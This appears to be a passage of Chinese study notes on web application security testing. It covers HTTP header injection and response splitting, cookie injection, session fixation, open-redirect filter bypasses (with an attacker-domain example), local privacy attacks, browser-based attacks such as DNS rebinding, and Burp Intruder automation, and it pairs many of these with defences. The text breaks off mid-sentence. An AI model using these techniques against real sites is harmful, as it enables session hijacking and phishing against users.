PreferedLanguage=EnglishSet-Cookie: SessId=120a12f98e8; // 此条为额外注入的 cookie 传送其他攻击当存在消息头注入漏洞，导致可以注入任意内容时，那么这个漏洞可以用来传送很多其他攻击； HTTP 响应分割当攻击者可以利用消息头漏洞，插入任意的内容时，那么有一种利用该漏洞的攻击方法称为 HTTP 响应分割，攻击者利用它创建一个木马页面，注入代理服务器的缓存中，等待管理员访问该页面，从而获得管理员的密码；过程如下： 攻击者利用注入漏洞，将木马页面做为第一个请求的消息头参数，并同时发第二个请求； 代理服务器收到两个请求，转发给应用程序； 应用程序收到两个请求后，生成两个响应； 代理服务器先收到第一个响应，由于注入的存在，该响应被代理服务器解析为两个响应； 其中第二个响应指向管理员登录页面，被代理服务器缓存（通过设置 If-Modified-Since 和 Last-Modified 两个字段，攻击者可以覆盖代理服务器上已存在的管理员登录页面）； 代理服务器收到应用程序的第二个响应，但由于前一个响应已经被解析为两个响应，当前收到的响应，对于代理服务器来说，相当于第三个响应，由于代理服务器判断之前的请求都已经获得响应，因此它会丢弃当前收到的响应； 管理员请求管理页面； 代理服务器发现缓存命中，在响应中直接返回缓存中的木马页面给管理员； 管理员输入密码，发送登录请求； 请求示例： 同时发送两个请求，在 HTTP 协议中，这样做是合法的 响应结果： 攻击者发送了两个请求，代理服务器也转发了两个请求，但由于响应分割，应用程序的第一个响应会被代理服务器解析为两个响应；之后应用程序的真正第二个响应会被代理服务器丢弃； 防止消息头注入漏洞防止的最好方法是不提取用户输入做为消息头的数据，如果实在要用，则需要采取以下措施： 输入确认：仅包含字母，最大长度为6字节； 输出确认：任何 ASCII 码小 0x20 的字符都应视为可疑字符，应拒绝包含该字符的请求； cookie 注入常见的 cookie 注入方式： 某些应用程序从请求参数中提取键值对，作为 cookie 值； 某些应用程序存在 HTTP 消息头注入漏洞，可利用该漏洞注入任意的 Set-Cookie 消息头； 某个目标域存在 XSS 漏洞，利用该漏洞设置一个 cookie，然后在该目标域父域或子域中使用； 利用主动中间人攻击（例如使用公共无线网络的用户）； 攻击者利用 cookie 达成攻击的方式： 某个特殊的 cookie 值可能会破坏应用程序的逻辑； 客户端代码通常直接信任并读取使用 cookie 值，很少加予过滤和净化，因此可以通过 cookie 来实现注入； 某些应用程序在 cookie 上放令牌，实现 CSRF 防御，攻击者可通过修改 cookie 来破坏这种防御； 攻击者通过 cookie 让用户登录自己的账号，下载其提前上传的攻击荷载； 设置任意 cookie，可利用会话固定漏洞； 会话固定漏洞某些应用程序在用户首次访问后，即为用户分配了一个匿名会话，等用户登录后，该会话保持不变，但权限升级；这里面存在一个漏洞，攻击者可以先访问应用程序，获得一个有效但无权限的会话，然后通过 cookie 注入漏洞，将该会话发给用户使用；一旦用户完成登录，攻击者拥有的这个会话的权限便直接升级了，从而实现了会话劫持； 只要会话跟用户信息相关，那么即使应用程序没有登录功能，攻击者也能够用会话固定漏洞来窃取用户信息；攻击者只需要先注入 cookie，然后等待用户在某个环节填写个人信息，保存在会话中以后，再用自己掌握的这个会话令牌，向应用程序发起请求，获得用户的个人信息； 有些应用程序很搞笑，它会直接接受用户提交的任意令牌，当检查发现该令牌不在自己的列表中时，会直接使用该令牌为用户创建一个新的会话；攻击者只需要制作一个令牌，然后通过网络任意的分发（如电子邮件），只要有用户点击，使用令牌发出请求，攻击者就可以实施劫持； 查找并利用会话固定漏洞存在固定会话漏洞的应用程序的常见特征： 应用程序向每个未验证的用户发布一个匿名令牌，并且在用户登录后，不发布新令牌，而是升级旧令牌（多数应用程序服务器的默认配置即是如此）； 应用程序不向未验证的用户发布匿名令牌，仅在用户登录后发布令牌；但是如果用户使用已有令牌和另外一名用户的密码登录，程序没有发布新令牌，而是使用旧令牌来存储新用户的会话； 以上两种情况，攻击者都可以通过注入自己获得的令牌，来劫持用户的会话； 渗透测试步骤： 通过任何可行的办法，获得一个有效的令牌； 访问登录页面，使用该令牌进行登录； 如果登录成功，且应用程序没有发布新令牌，则表示存在固定会话漏洞； 如果应用程序没有登录功能，但在某个阶段使用会话来保存用户的敏感信息，那么注意检查用户提交敏感信息的前后，其获得和使用的令牌是否发生了变化； 渗透测试步骤： 以完全匿名的用户身份获得一个会话令牌，然后完成提交敏感数据的步骤； 继续浏览，直到任何显示敏感数据的页面； 如果最初获得的令牌，现在可以用来访问显示敏感数据的页面，则表示应用程序存在漏洞； 如果发现漏洞，进一步检查应用程序是否接受并非它发布的令牌；如果接受，则意味着攻击者可以非常容易利用该漏洞； 防止会话固定漏洞任何时候，只要用户通过验证，应用程序就应该为用户发布一个新令牌；有些特别注重安全的应用程序，甚至使用单页面令牌，来提供深层的防御； 开放式重定向漏洞如果应用程序提取用户的输入，作为重定向的数据，那么应用程序可能存在开放式的重定向漏洞；攻击者可以使用该漏洞进行钓鱼攻击，引导用户到攻击者控制的目标页面；由于这个页面是通过重定向到达的，普通用户往往不会对其产生怀疑； 查找并利用漏洞检查应用程序所有的重定向响应，一般有以下几种常见的做法： 使用 3XX 状态码和 Location 字段； 使用 Refresh 消息头，并设置时间间隔为 0，这样就可以立即触发，实现类似重定向的效果； 使用 HTML 中的 meta 标签，来复制消息头的行为，从而实现重定向的效果； 问：meta 标签的用途？ 答：HTML 有一些用来表示页面元信息的标签，例如 base, link, script, style, title 等；如果有些元信息无法使用已有的元标签进行表示，则使用 meta 来表示，相当于“其他”； 使用 Javascript 的 API 来实现重定向 渗透测试步骤 使用拦截器检查应用程序中所有使用了重定向的位置； 分析每个重定向使用了什么样的方法； 绝大多数的重定向是不受用户控制的，有一个常见的场景是用户浏览到某个页面时，应用程序要求用户进行登录，此时应用程序会重定向的登录页面；然后在用户登录后，应用程序会重定向跳回之前中止浏览的页面（开发者经常将目标页面的URL 放在请求参数中）； 渗透测试步骤： 如果用户提交的数据，在重定向的绝对 URL 中出现，则尝试修改 URL 中的域名，看应用程序是否会对新域名发起访问，重定向到新域名； 如果用户提交的数据，在重定向的相对 URL 中出现，也将其改为另外一域名，然后观察应用程序的反应； 如果响应出现以下行为，则说明漏洞存在： 有些应用程序允许用户指定 URL，然后应用程序会加载该 URL 指向的内容，到当前页面的 iframe 中；虽然它不是严格意义上的重定向漏洞，但是二者很类似，攻击者可以同样加予利用； 为了阻止重定向攻击，开发者会对用户的输入进行净化和过滤，一般有如下两种常见的机制： 阻止绝对 URL应用程序检查用户的输入是否以 http 开头，此时可尝试通过对 http 进行混淆，看是否能够避开过滤 应用程序检查并删除 http 字样，此时可尝试添加多个 http；若应用程序没有递归净化，则可能避开 应用程序检查 URL 是否包含自己的域名，则攻击者可以在其控制的域名中添加应用程序域名作为子域名或路径 附加绝对前缀应用程序开发者可能会在用户的输入前面，添加一个指向自己域名的前缀，来避免重定向漏洞；这种方法不错，但是有个前提，即开发者添加的前缀一定要有斜杠作为结束，不然攻击者仍然有机会操控该 URL 的结果 12&lt;!--假设开发者添加的固定前缀为 http://app.net，则攻击者将输入设计为 .attacker.net，则最终结果变成了如下--&gt;http://app.net.attacker.net 有些重定向的动作并不是由服务端的响应来发起的，而是由前端的 js 代码直接提取用户输入来生成的，此时应仔细检查前端 js 代码的逻辑，看其是否存在漏洞；常见的 js 重定向 API 如下： document.location document.URL document.open() window.location.href window.navigate() window.open() 防止开放式重定向漏洞避免提取用户的输入生成重定向目标，是防御重定向漏洞的根本办法；有些开发者使用一个通用的重定向页面 + 目标 URL 参数来实现重定向，比较好的替代办法如下： 使用直接指向目标页面的 URL，避免使用重定向页面进行跳转； 使用列表，参数只传索引即可，而不是传送目标 URL； 如果一定要将用户的输入合并到 URL 中的话，应该采取如下措施： 使用相对 URL 作为输入；严格检查，不要尝试进行净化；确保输入以斜杠+字母开头，或者直接以字母开头，其他情况通通拒绝； 如果用户提交的 URL 不必斜线开头，则添加前缀时务必添加斜线； 避免使用前端 JS 代码来实现重定向，因为这部分代码不可控制，而且其逻辑完全暴露在了攻击者面前； 客户端 SQL 注入 HTML5 支持客户端使用 SQL 数据库，应用程序可以客户端存储数据，并使用 js 进行访问；此特性有助于客户端的功能实现离线工作； 当使用 SQL 数据库时，不管是客户端还是服务端，都可能存在 SQL 注入的漏洞，常见的易受攻击的应用程序： 社交网络程序：将用户的联系人存储在本地数据库中； 新闻应用程序：将文章和用户评论存储在本地数据库中，以便离线查看； Web 邮件程序：将电子存储在本地，以便离线状态下能够正常工作，并将写好的邮件在上线后进行发送； 如果攻击者实现了 SQL 注入，就可以查询用户本地数据库中的数据，并进行提取发送给攻击者； 客户端 HTTP 参数污染攻击者通过针对性的设计 HTTP 请求参数，可以利用服务端应用程序的逻辑，同样，这种做法也可以用于破坏前端的逻辑；漏洞的前提是服务器会提取攻击者的输入，并将其用于生成 URL 的参数，此时攻击者就有机会向 URL 中注入一些额外的参数，破坏该 URL 原本的逻辑； 本地隐私攻击在某些场景下，例如网吧，同一台计算机会被很多用户共用使用，并且他们很可能会访问同一个应用程序，因此，攻击者此时有机会访问受害者使用的同一台计算机； 应用程序会在本地存储一些用户的敏感信息，为了检测存储了哪些信息，最好的办法是使用虚拟机，因为虚拟机里面是一个干净的操作系统和浏览器，很容易找到目标数据； 另外，有时候应用程序存储的数据可能会设置为隐藏模式，因此，需要在文件系统的选项中，将所有隐藏文件显示出来，以方便查找； 持久性 cookie多数浏览器支持持久性 cookie 的功能，并将这些 cookie 值保存在本地文件系统中；一些应用程序会使用该功能保存敏感数据； 渗透测试步骤 在解析应用程序的环节中，特别注意带有 set-cookie 指令的响应，如果其中包含 expire 属性，则该 cookie 值将被保存，直到过期； 如果某个持久性的 cookie 中包含敏感数据，由于攻击者能够使用同一台电脑，因此攻击者能够马上获取该 cookie 中的数据。例如直接使用 cookie 中的令牌，无须破译其中的内容，以受害者的身份访问应用程序； 缓存 Web 内容大多数浏览器默认会将非 SSL 页面的内容保存在缓存中，并存储在本地文件系统中，除非应用程序有在响应中明确要求不要保存； 渗透测试步骤 检查服务器的 HTTP 响应内容，查看其中的缓存指令； 禁止缓存的相关指令包括： Expires: 0 Cache-Control: no-cache Pragma： no-cache 如果响应中没有这些指令，那么内容正常都会被浏览器缓存； 使用虚拟机中操作系统默认安装的干净的浏览器，清除所有缓存和cookie，然后访问包含敏感数据的应用程序页面； 检查新增的缓存文件，看其中是否包含敏感数据； 如果新增的缓存文件很多，则提取一个页面字符串，在缓存中进行搜索定位； 不同的浏览器默认的缓存目录不同，应根据情况在不同的位置进行查找； 浏览历史记录多数浏览器都会保存用户的浏览记录，而某些浏览记录对应的请求，可能使用 GET，因此该请求的参数中，很可能包含有敏感数据； 渗透测试步骤 解析应用程序时，注意通过 URL 参数传送敏感数据的所有情况； 如果存在以上情形，查看浏览器的浏览记录，看这些敏感数据是否出现在其中； 自动完成很多浏览器提供自动完成的功能，该功能会保存用户名、卡号、密码等敏感数据，并将数据存储在本地文件系统中；这些数据可被攻击者访问的同时，还有可能被 XSS 攻击获取（伪表单，诱使用户触发自动完成功能）； 渗透测试步骤 解析应用程序中，确定包含表单的源代码位置 如果表单的标签未设置 autocomplete=off，则用户输入的数据将被浏览器默认保存在本地（如果浏览器选项已经设置开启自动完成功能的话）； Flash 本地共享对象Flash 有自己的存储机制，更有意思的是，它可以跨浏览器共享数据，只要它们都安装了相同的 Flask 插件即可； 渗透测试步骤 有些现成的插件（如 BetterPrivacy）可浏览由用户应用程序创建的 Flash 本地共享对象； 不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始 Flash 存储内容； Silverlight 独立存储Silverlight 跟 Flash 一样，也有使用自己的独立存储 渗透测试步骤 不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始存储内容 IE userDataIE 也有自己的本地存储机制，称为 userData，同样可以直接查看其中的原始存储内容，一般在以下路径 HTML5 本地存储H5 引入了一些新的存储机制，包括 会话存储 本地存储 数据库存储 由于 H5 的规范还在完善中，因此其存储位置可能会动态变化，应根据浏览器支持的 H5 版本而定； 防止本地隐私攻击 应避免将敏感数据存储在持久性 cookie 中 应用程序应使用合适的禁止缓存指令，避免浏览器敏感数据保存在本地； 杜绝使用 URL 参数传递敏感数据，而应使用 POST 方法； 在用户输入敏感数据的表单位置，应添加 autocomplete=off 属性，以避免自动完成功能记录用户输入的敏感数据； 如果需要在本地存储敏感数据，应该对这些数据进行加密，以防止攻击者直接访问； 告知用户存储风险，以便需要时，用户可以禁用该功能； 攻击 ActiveX 控件 ActiveX 是一个很有意思的技术理念，由于很多软件背后存在一些通用的功能，因此如果每个软件如果都需要就这些通用功能进行编写的话，显然是一种重复的工作，尤其是跨语言的情况（相同语言内部，可以使用导入第三方模块来解决）；为了让不同语言编写的功能，能够实现复用，微软发明了 ActiveX 技术，它本质上是一种接口规范，各应用程序将可供外部调用的功能，按该规范进行编写，则 Windows 操作系统上的其他程序，就可以对其进行调用，而无须打开源应用程序； ActiveX 控件是专指 Active 理论在 IE 浏览器上的应用，IE 浏览器通过 ActiveX 控件，可以实现对本地其他应用程序功能的调用，例如本地视频播放器、Flash 播放器、Office 软件等，这样可以大大加强 IE 本身可以提供的功能，让 IE 可以直接处理原本它处理不了的文件，给用户提供更好的浏览体验； 不同的应用程序在 IE 中有不同的 ActiveX 控件，用户可以根据需要进行安装；当安装了某个 ActiveX 控件后，该控件就会在浏览器中运行，当用户需要打开或播放某个该控件支持的文件时，该控件就会向操作系统调用本地应用程序，处理该文件，并将结果返回给 IE 浏览器；ActiveX 控件相当于充当了 IE 浏览器和本地应用程序之间的桥梁； 开发者在 HTML 源代码中，指定某个 ActiveX 控件的调用，并传递相应的参数；IE 浏览器在解析 HTML 时，将根据控件 ID，调用该控件，并传递相应的参数，之后的工作将由 ActiveX 控件接手处理； ActiveX 控件的优点在于其提供了强大的灵活性，因此能够带来很好的协同效果，但这是一把双刃剑，其功能越强大，意味着攻击者越有机会利用它来实现攻击目标，而绝大多数用户是缺少安全意识的，因此完全无法保护好自己；更糟糕的是， ActiveX 没有像 Java Applet 控件一样使用沙箱技术，一旦用户安装了某个 ActiveX 控件，该控件将成为了操作系统的一部分，具备很大的权限； ActiveX 控件技术仅在 IE 浏览器中被支持，其他家的浏览器都不支持，安全起见，普通用户最好禁用该功能； 查找 ActiveX 漏洞如果一个网站使用了 ActiveX 控件，则在其网页的源代码中，将出现调用或下载安装该控件的相关代码，示例如下： classid 参数用来标识控件的全局 id；codebase 参数用来标识控件下载地址； 在首次安装的时候，浏览器会弹出警告，要求用户确认控件的可信性；一旦用户点击确认后，该控件即被安装并标记为“脚本执行安全”；由于控件是全局的，这意味着，随后其它网站也可以调用该控件，调用方式如下： 渗透测试步骤： 当发现网页上使用 ActiveX 控件时，一种探测该控件是否存在漏洞的方法为修改调用该控件的代码，替换提交给控件的参数，观察控件的执行结果； 探查是否存在缓冲区溢出漏洞（详见第 16 章的描述）； 查看 ActiveX 的方法，是否为一些高风险的方法，例如 LaunchExe 等； 页面上的源代码常常并没有调用控件中的所有方法，因此，可以通过一些第三方工具，例如 COMRaider，枚举出控件的所有方法； 防止 ActiveX 漏洞ActiveX 控件本质上是一个编译软件，如果阻止这种类型的软件受到攻击，是一个很大很复杂的课题。主要有以下一些注意事项： 发布控件前应进行审查，确保不存在缓冲区溢出之类的漏洞； 任何读取用户输入，并调用文件系统或操作系统的方法，都必须是私有方法，不得对外暴露； 可考虑增加域名确认，仅限特定域名列表中的域名，发起对控件的调用； 可考虑增加参数签名，对所有发给控件的参数，进行签名；如果签名无效，则拒绝调用； 攻击浏览器同应用程序一样，浏览器本身也是一个应用程序，因此其也不可避免存在漏洞；攻击者如果能够发现并浏览器的漏洞，就可以攻破所有的网站，而不单单是存在漏洞的网站； 记录键击当浏览器窗口获得焦点时，JS 脚本可以获取所有键盘输入，因此攻击者通过键击劫持，可以捕获用户输入的敏感数据； 一种攻击方法是攻击者在页面的 iframe 注入其设计的脚本，捕获用户的键盘输入，并将该输传递给顶层标签，同时在用户输入暂停时，暂时放弃激活状态，这样可以用户的输入仍然能够出现在顶层窗口中，并且光标也会处于闪烁的状态，实现在用户在毫无知觉的情况下，捕获其输入； 窃取浏览器历史记录与搜索查询这个很有意思，攻击者通过 JS 代码，动态创建很多常用站点的链接，以及一些常用的搜索关键字，注入在网页中；如果用户最近访问过这些站点，或者执行过相关的查询，浏览器将根据最近的浏览记录，将相应的链接标记为已访问的颜色（与未访问过的链接颜色有所不同），之后，攻击者再使用 JS 代码中的 getComputedStype 函数，查询其创建的链接的颜色样式，即可获知哪些链接是用户最近访问过的； 获知用户登录过的应用程序攻击者枚举其想攻击的应用程序，向这些应用程序的某个受保护页面（需登录才能访问的页面）发送请求；虽然攻击者并不能访问目标应用程序返回的响应内容，但是如果这些页面不能被访问，那么目标应用程序会发送错误消息，或者发送重定向地址，此时攻击者通过提前设计好的错误处理函数，即可获知其发送的请求的状态，进而知道哪些网站是用户登录过的；根据获得的已登录的清单，攻击再有针对性的设计跨站点请求伪造，提高攻击效率； 端口扫描攻击者可以利用 JS 代码，先确定用户主机的 IP 地址，得到本地网络的 IP 范围，然后对任意 IP 地址和端口发送请求，以测试其连通性；虽然同源策略可以阻止 JS 代码读取请求的响应，但是 JS 能够检测到请求错误或者未收到请求。通过这种方式，攻击者即可知道本地有哪些主机及相应的端口是可供访问的，为下一步攻击做准备； 攻击本地网络其他设备当获知本地可访问的主机和端口后，攻击者接下来可以有针对性的做进一步探查。例如运行定制化的脚本和错误处理函数，尝试获取可访问主机上的某个常用内容；如果该内容存在，错误函数未被触发，说明该主机符合某种预设的类型；之后，再利用该类型设备的已知漏洞，对其进行攻击；例如尝试使用默认密码进行登录等； 如果攻击者能够控制路由器，那么就可以通过设置 DNS 重新绑定，来避开同源策略的限制，从而能够实施跨站点脚本攻击，获取目标应用程序的响应内容； 利用非 HTTP 服务同一台机器上，可能在不同的端口运行着一些非 HTTP 服务，可能是为了兼容性考虑，大多数非 HTTP 服务都接受意外的输入，有些服务甚至接受 HTTP 消息头，并对其进行处理；如果发生这种情况的话，攻击者就可以在消息主体中发送该非 HTTP 服务可识别的二进制内容（HTTP 协议可用来发送任意内容的消息主体） 如果该非 HTTP 服务本身存在已知的漏洞，则攻击者就可以加以利用；甚至，攻击者还可以利用该非 HTTP 服务为跳板，对运行同一服务器上的 Web 应用程序发起请求，进行攻击； 要实现这种攻击，需要满足如下一些条件： 非 HTTP 服务使用的端口未被浏览器禁止； 非 HTTP 服务接收 HTTP 消息头； 非 HTTP 服务会在其响应中回显一部分请求内容； 浏览器接收不包含有效 HTTP 消息头的响应，并且将部分响应内容做为 HTML 处理（出于兼容性考虑，正常会处理）； 浏览器在处理 cookie 时，会忽略端口号（正常会忽略）； 利用浏览器漏洞如果用户安装的某个版本的浏览器或者浏览器扩展存在已知的漏洞，则攻击者就可以利用该漏洞，例如利用 Java Applet 扩展中的已知漏洞，与本地计算机或者其他非 HTTP 服务进行二进制通信；攻击者可以利用该通信渠道，对端口进行扫描，发现其他存在的服务，并进一步利用该服务存在的已知漏洞； DNS 重新绑定这个有点意思，工作原理如下： 攻击者在其控制的服务器上放置恶意脚本； 在 DNS 域名服务器上，攻击者将其域名解析配置到上一步包含恶意脚本的服务器，并将 TTL 时间配置很短，以避免其解析被缓存； 当受害者访问攻击的网站时，会自动下载恶意脚本到本地； 该恶意脚本会向攻击者的网站再发送一次请求，由于 TTL 存放时间很短，浏览器因此再次向 DNS 域名服务器提交解析请求； 此时攻击者将 DNS 域名解析配置修改为目标应用程序的 IP； 浏览器获得目标应用程序的 IP，但却误以为是攻击者控制的域名的 IP，并向其发出请求； 该请求将被目标应用程序接收并处理和返回响应； 浏览器收到响应后，误以为是攻击者的域返回的响应，因此恶意脚本可以读取该响应的内容，并发送给攻击者； 借助浏览器框架针对 XSS 漏洞的攻击，市面上已经有很多成熟的浏览器攻击框架，用来演示如何利用这种漏洞进行攻击；这意味着当攻击者发现漏洞后，可以直接利用这些现成的框架，发起攻击；这些框架会利用已知的 XSS 漏洞，注入 JS 恶意脚本，定期向攻击者控制的服务器发送其收集到的数据，并可以接收攻击者发送的指令； 这些框架提供以下常用的功能： 记录用户的键击，并发送给攻击者； 劫持用户的会话； “指纹”识别用户使用的浏览器（攻击者可针对性的利用该浏览器的已知漏洞）； 对用户私有网络中的其他主机进行进行端口扫描，并将结果发送给攻击者； 通过用户的浏览器发送恶意请求，向其他 Web 应用程序实施攻击； 蛮力攻击用户的浏览历史记录，并将结果发送给攻击者； 攻击框架 BeEF 的使用示例： 另一款功能强大的框架是 XSS Shell，可注入任意的 JS 代码，即使用户已经跳转到应用程序的其他页面，它还会驻留在用户的浏览器中； 中间人攻击攻击者通过中途拦截并更改网络请求来实施攻击，例如在无线公共热点和共享办公网络的场景中；很多 Web 应用程序仅在部分包含敏感数据的页面使用 HTTPS 来加密传输，而不是所有的连接都是加密的，这就为中间人攻击者创造了机会，尤其是当非加密页面使用绝对 URL 来引用脚本文件的话；攻击者可以替换这些脚本文件，注入恶意代码，实现攻击目的； 由于同源策略的存在，虽然攻击者更改了引用脚本的 URL 地址，但是此时该页面是在 HTTP 下传输的，新脚本文件中的代码，并无法访问原程序通过 HTTPS 协议传输的内容；接下来攻击者需要修改某个 HTTP 响应，构建重定向，让浏览器将 HTTP 切换为 HTTPS 并加载同一页面（或者在其他响应中改写页面上的 URL，让用户在不知情的情况下，点击改写后中的 URL）； 此处有疑问：为什么浏览器不是使用 HTTPS 响应返回的页面中的脚本，而不是使用原 HTTP 响应返回的页面中的脚本？待后续做实验进行验证 即使应用程序不使用未加密的 HTTP 传输内容，攻击者仍然可以修改用户访问其他非加密域的请求，并返回重定向的响应，该响应将诱使用户的浏览器向目标应用程序发起 HTTP 请求，然后攻击者拦截该请求，并返回任意的内容（此时即使应用程序的服务端都不监听 80 端口也不起作用，因为请求根本就没有到达应用程序的服务器）；接下来攻击者可以使用以下攻击技巧来攻击应用程序的 HTTPS 传输： 当拦截到用户浏览器向目标程序发出的非加密 HTTP 请求后，攻击者通过拦截并返回自定义的响应，修改用户的 cookie 值（不管用户之前是否已经通过 HTTPS 收到了 cookie 值，都会被修改）；如果该 cookie 被原程序的代码以不安全的方式进行处理，例如存在读取 cookie 的 XSS 漏洞，那么攻击者通过针对性的设计 cookie，就可以利用该漏洞，实现攻击目的； 有些浏览器扩展并不区分和隔离普通 HTTP 和加密 HTTPS 的响应内容，而是将它们视为同一来源，因此攻击者通过 HTTP 返回的脚本，就可以通过这些扩展来访问用户使用 HTTPS 访问的内容（借刀杀人）； 当在不安全的网络（例如公共网络 通过 HTTPS 访问敏感内容时，应将浏览器的代理选项设置为“对除 HTTPS 以外的所有协议，使用无效的本地端口”，这样可以一定程度的降低攻击风险； 小结严重的缺陷常常隐藏在大量无关紧要的客户端缺陷中，攻击者可以利用这类缺陷对应用程序实施攻击； 14. 定制攻击自动化应用定制自动化攻击对攻击进行自动化，可以提高攻击的效率；攻击自动化有以下几个常用的场景： 枚举标识符：大多数 Web 应用程序会使用某种标识符来标识资源；标识符的范围也意味着有效资源的数量，因此通过自动枚举标识符，并发送请求，即可快速知道资源的存在范围； 获取数据：通过自动化大量发送请求来爬取有用的数据； 漏洞模糊测试：自动化发送大量设计过的异常字符串，观察应用程序的响应，即可探查应用程序存在哪些潜在的攻击面，作为下一步详细探查的筛选工作； 枚举有效的标识符一些常见的需要枚举有效标识符的情况： 枚举用户名列表，发送大量请求，根据应用程序的响应判断哪些用户名是存在的； 枚举各种资源标识符，如文件ID，账号、雇员编号、日志记录等，根据应用程序的响应，判断存在哪些资源； 枚举令牌（如果生成的令牌存在规律的话），判断存在哪些有效的令牌； 基本步骤先做前期的探查，包括以下两个动作（请求响应对）： 请求的参数包含某个标识符； 当改变这个参数值，服务器的响应也相应发生变化；并能够根据变化的区分，判断标识符是否有效； 探测触点一些常见的响应出现变化的特征 HTTP 状态码 200，请求成功 301或302，请求被重定向到另外一个地址； 401或403，请求未授权或被禁止 404，请求的资源不存在； 500，服务器处理请求的过程中发生错误； 响应长度通常应用程序会使用某个页面模板，并填充数据，生成最终的 HTML 页面；当请求错误时，模板的长度一般要小于正常的模板，因此，通过响应的长度，即可判断请求是否成功； 响应主体请求成功和失败的响应主体正常有所区别，并可以通过某个关键字识别出来，因此可以通过在响应中搜索这个关键字符串，来判断请求是否成功； Location 消息头有些应用程序使用重定向处理资源请求，当成功时，重定向到资源页面；当失败时，重定向到失败页面；因此，通过 Location 消息头字段可以判断请求是否成功； Set-Cookie 消息头当请求有效时，有些应用程序会在 cookie 消息头中进行标识；例如当用户提交的密码正确时，响应会携带 cookie；如果密码无效，则不会； 时间延迟当请求无效时，有可能客户端很多就会收到响应；如果请求有效时，有可能服务器接下来要做很多工作，例如进行大量的计算，因此，通过时间延迟的长短，即可判断所提交的请求是否有效； 编写攻击脚本虽然可以使用命令行脚本来编写，但由于命令行的表达式能力天生比较弱鸡，正常还是使用一些高级语言比较好，例如 Python、Java、Javascript、C# 等； JAttack除了自己编写攻击脚本外，更好的方法是使用一些现成的开源工具，例如 JAttack；JAttack 是用 Java 编写的，它的基本概念是将攻击请求设计成一个类，并通过属性控制哪些字段要在攻击中修改，哪些不能修改，并附上修改的方法，这样就可以很灵活的发送各种预期请求； 获取有用的数据定制并发送专门设计的请求，不但可以利用漏洞获取有用的数据，有时候，即使没有漏洞，仅仅通过枚举的方式，也可以获取到有用的数据，常见情况如下： 应用程序允许用户查看自己的订单，只要在请求中枚举出有效的订单号，就可以查看到其他用户的订单； 通过回答预设问题来实现忘记密码的功能，通过枚举大量的用户名，就可以获取大量的预设问题，然后可从中找到容易猜测答案的问题； 应用程序的某个接口接受一个用户 id，然后就会展示用户的相关信息，包括权限情况等，因此攻击者通过枚举 ID 即可以发现哪些用户账号拥有管理员权限，即可缩小范围，做进一步的针对性攻击； 常见漏洞模糊测试在探查漏洞的阶段，针对解析过程中已知的各种请求参数，针对性的替换为各种专门设计的攻击字符串，然后监控应用程序的响应，即可更加快速的发现应用程序中可能存在的各种漏洞，例如 SQL 注入、命令行注入、路径遍历、XSS 漏洞等； 由于请求参数需要根据应用程序的具体情况进行设计，因此这种类型的定制自动化攻击，往往要比全自动化的工作更有效率；其根本原因在于攻击者可以站在开发者的角度进行换位思考，推测其背后的控制逻辑，这是多数全自动化工具做不到的； 整合全部功能 估计市面上应该有很多将攻击进行自动化的工具，例如本书作者开发的 Burp Intruder，利用这些成熟的工具，可以让攻击更加的快速和高效； 以下是 Burp Intruder 的一些基本功能介绍 选择替换位置在发起大量攻击请求时，基本的作法是在请求中特定位置插入有效荷载，并使用不同的值来替换它；这些插入的位置即可以是请求参数，也可以是请求头部或主体的任何位置； 使用方法： 使用 add 按钮为替换位置添加标记，如上面的截图，在添加标记后，替换位置的前面会使用特殊符号标记起点和终点，并用红色显示整个位置；当发起请求后，这些位置将被有效的攻击荷载替换，如果没有替换，则使用原来的值； 使用 auto 按钮可以自动化标记所有可替换的位置，减少手工标记的工作量； sniper 攻击（狙击）：一次针对一个标记位置，使用所有的有效荷载轮流替换它并发出请求；之后转到下一个位置，重复前面的动作； 非 sniper 攻击：一次请求同时替换多个位置； 设置替换值有效荷载可以自己设计，同时也可以利用 Intruder 现成的内置设计，这样可以节省很多时间，其内置的有效荷载包括： 内置现成的数据列表，并且该列表支持自定义的配置，如添加和修改等； 根据模式对荷载进行定制迭代，假设应用程序接受 ABC45D 形式，则迭代器就可以枚举出所有符合这个规则的值； 字符的大小写替换，例如 password 可替换为 p4ssword, passw0rd, Password, PASSWORD 等，可用于实施密码的蛮力攻击； 数字类型的遍历，例如可用于遍历文档 ID、会话令牌等场景；数字支持多种进制，整数、分数、顺序、递增递减、随机等； 日期：对日期类型的输入进行枚举； 支持 Unicode 编码，对恶意字符的进行编码，避开过滤； 支持对字符块输入进行缓冲区溢出漏洞的探查； 支持对特殊字符集生成各种排列组合； 支持字符打乱和位翻转，系统性的操纵参数值的各个部分，探查应用程序背后的处理逻辑； 支持定制化的预处理：当了解到应用程序的某种处理规则时，在提交请求前，可以先对枚举值进行预处理，以通过应用程序的检查，例如各种编码方案、散列操作、大小写修改等； 默认情况下，Intruder 会对请求中的字面量字符进行 URL 编码，不然该请求会由于不符合 HTTP 规则而失效； 设置响应分析在实施攻击前，需要先明确需要分析响应中的哪些属性，例如扫描错误消息以发现潜在漏洞、扫描特定字符串以便 XSS 注入漏洞等；除了使用特定字符串或者正则表达式来搜索匹配外，还可以设置从响应中提取有用的数据； 攻击1：枚举标识符假设应用程序支持匿名用户注册，则可以通过注册多个账号，连续多次登录，获取不同账号的令牌，了解令牌的生成规律； 当发现某种规律后，就可以根据该规律，大量生成一些潜在可能有效的令牌，然后找到能够验证令牌是否有效的请求响应对，大量发送请求，筛选出有效的令牌； 假设获取的多个令牌如下： 从中可发现主要是最后3位数在变化，因此，可以就最后3位进行枚举 请求一个需要登录后才访问的页面，如用户个人令牌页，如果令牌有效，正常会收到 200 响应；如果无效，正常会被重定向到登录页面； 同时，虽然都是 200 的响应，但根据响应长度的不同，我们还可以猜测到某些令牌返回的响应页面不同，很有可能这些令牌背后是拥有更高级权限的用户，所以页面上显示有更多的菜单；可点击查看该响应中的 HTML 源代码进行确认； 除了状态码外，返回的其他消息头字段如果存在异常，往往意味着里面包含有价值的信息，应该特别进行留意； 攻击2：获取信息应用程序某些页面的请求可能使用 id 参数，此时可以以当前某个有效的 id 为起点，改变 id 的最后两位数，发起请求进行遍历，并配置 Intruder 中的匹配选项，提取指定位置的内容； 攻击3：应用程序模糊测试对于每个 URL，position 选项卡的 auto 功能可以实现自动化的模糊测试，它的原理很简单，即使用常用的有效荷载，逐一替换每一个请求参数，然后收集好响应结果，为下一步分析和发现异常做做好准备工作； 对响应结果进行初步分析可以发现，应用程序可能容易受到 SQL 